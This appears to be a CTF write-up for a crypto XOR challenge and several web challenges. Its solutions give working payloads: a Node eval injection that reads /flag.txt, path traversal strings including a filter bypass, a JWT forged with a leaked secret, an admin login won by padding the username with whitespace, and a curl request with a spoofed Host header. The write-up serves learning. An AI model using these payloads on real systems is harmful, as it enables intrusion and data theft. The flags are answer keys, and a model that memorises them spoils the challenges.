The admin is thinking: 5rOneX3M+PPwAatU+E3yJ87FhrTJxYOwbAulyllnfGd5zY0N0xwGhS1T8kO6R3pk/+murhxqbuFpPVQfXdCOQA==
```

[XORing these two](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)XOR(%7B'option':'Base64','string':'gN/GHgb/jsCCePRjySDBeLf18%2Bu9rbLeB1SRlW4PTBJApbohpik12hkMnHDNGDMyguavrx1rb%2BBoPFUeXNGPQQ%3D%3D'%7D,'Standard',false)&input=NXJPbmVYM00rUFB3QWF0VStFM3lKODdGaHJUSnhZT3diQXVseWxsbmZHZDV6WTBOMHh3R2hTMVQ4a082UjNway8rbXVyaHhxYnVGcFBWUWZYZENPUUE9PQ) gives the flag.

## Flag
```
flag{3v3ry_71m3_y0u_th1nk_4_7h0u9h7,u53_4_n3w_IV}
```

# web - Lens of Truth
> Use the tools at your disposal to look a bit closer...
>
> http://web.red.csaw.io:5009/

## Solution
View source.

## Flag
```
flag{s33k_th3_truth}
```

# web - robots
> Only robots can find my treasure
>
> http://web.red.csaw.io:5000

## Solution
[robots.txt](http://web.red.csaw.io:5000/robots.txt) has an [interesting path](http://web.red.csaw.io:5000/super-duper-extra-secret-very-interesting).

## Flag
```
flag{welcome_to_website_hacking}
```

# web - traverse 1
> Go now, traverse. The flag is at `/flag.txt`.
>
> http://web.red.csaw.io:5001

## Files
- index.js

## Solution
Put `/flag.txt` in the box.

## Flag
```
flag{wow_you_got_it!_lets_see_if_you_can_get_the_next_one...}
```

# web - calculator app
> I just made my first website! Its just a simple calculator. I dont really know what I'm doing, can you help me test it?
>
> The flag is at `/flag.txt`.
>
> http://web.red.csaw.io:5005

## Files
- index.js

## Solution
Our input is `eval()`ed. Submit

```js
require('fs').readFileSync('/flag.txt').toString()
```

to get the flag.

## Flag
```
flag{rce_is_a_fun_thing}
```

# web - traverse 2
> Go now, traverse again. The flag is at `/flag.txt`.
>
> http://web.red.csaw.io:5004

## Files
- index.js

## Solution
We can't start with `/`, so we just submit

```
../../../../../../../../../flag.txt
```

## Flag
```
flag{that_one_was_a_bit_harder_but_there_is_one_more...}
```

# web - traverse 3
> Go now, traverse again again. The flag is at `/flag.txt`.
>
> http://web.red.csaw.io:5003

## Files
- index.js

## Solution
Now `../` is filtered out, but in a linear fashion. Submit

```
..././..././..././..././..././..././..././flag.txt
```

to get the flag.

## Flag
```
flag{I_must_yield_you_have_proven_yourself_a_dedicated_hacker}
```

# web - jwt
> you'll never get access to the flag!
>
> http://web.red.csaw.io:5013

## Files
- app&#46;py

## Solution
We can request access to any file that isn't flag.txt. However, note that the JWT secret is stored at `static/secret.txt`. After requesting access to `secret.txt`, we can read the secret key, which is `super_secret_k3y`. Now we just need to sign our own JWT to give us access to `flag.txt`.

```json
header
{
  "alg": "HS256",
  "typ": "JWT"
}
payload
{
  "filename": "flag.txt"
}
```
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmaWxlbmFtZSI6ImZsYWcudHh0In0.HbdszJEzWms5E81eENfvaIore8viKKT6U-B2gB59g3o
```

## Flag
```
flag{n0_fr33_acc3es}
```

# web - whitespace
> I think I handled the authentication correctly here... (this challenge resets its database every 60 seconds)
>
> http://web.red.csaw.io:5002

## Files
- app&#46;py

## Solution
The app sets our session username after stripping whitespace.

```python
session['username'] = username.strip()
```

Thus, we make a new account with username `admin    ` and login to get the flag.

## Flag
```
flag{gotta_make_sure_you_handle_the_whitespace!}
```

# web - Traefik
> hint: Try to learn how traefik routes requests. Reddit is NOT a part of the challenge. Do not attack reddit.
>
> http://web.red.csaw.io:5006

## Files
- docker-compose.yml

## Solution
There is a `flag` container exposed by Traefik.

```yaml
  flag:
    container_name: flag
    build: .
    command: gunicorn -b "0.0.0.0:80" -w 1 flag:app
    labels:
      - "traefik.http.routers.flag-http.rule=Host(`flag`)"
      - "traefik.http.routers.flag-http.entrypoints=http"
```

Traefik routes with the `Host` header, so we can get the flag with curl.

```
$ curl http://web.red.csaw.io:5006 -H "Host: flag"
flag{81rD5_@RnT_r3@1!!!!!}
```

## Flag
```
flag{81rD5_@RnT_r3@1!!!!!}
```
